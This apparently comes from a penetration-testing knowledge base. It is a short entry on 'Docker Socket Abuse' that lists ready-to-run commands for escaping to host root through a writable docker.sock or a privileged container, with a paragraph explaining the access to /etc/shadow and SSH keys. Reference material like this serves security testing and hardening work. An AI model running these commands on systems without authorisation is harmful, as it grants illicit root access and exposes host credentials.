---
id: priv-008
title: "Docker Socket Abuse"
category: privilege_escalation
tags: [docker, container-escape, socket-abuse, linux-privesc]
platform: [linux]
commands:
  - "ls -la /var/run/docker.sock && id"
  - "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
  - "docker run --privileged --rm -it alpine sh -c 'mount /dev/sda1 /mnt && chroot /mnt sh'"
  - "docker images && docker ps -a"
references:
  - "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation"
  - "https://gtfobins.github.io/gtfobins/docker/"
---

If a user has read/write access to the Docker Unix socket at `/var/run/docker.sock`, they have effective root on the host because Docker commands execute as root and containers can mount the entire host filesystem. The simplest exploitation path is to spawn a new container with the host's root filesystem mounted at `/mnt` and then `chroot` into it, granting unrestricted access to all host files including `/etc/shadow` and SSH keys. This technique also applies to privileged containers, which can mount host block devices directly and access the underlying filesystem without any chroot gymnastics.
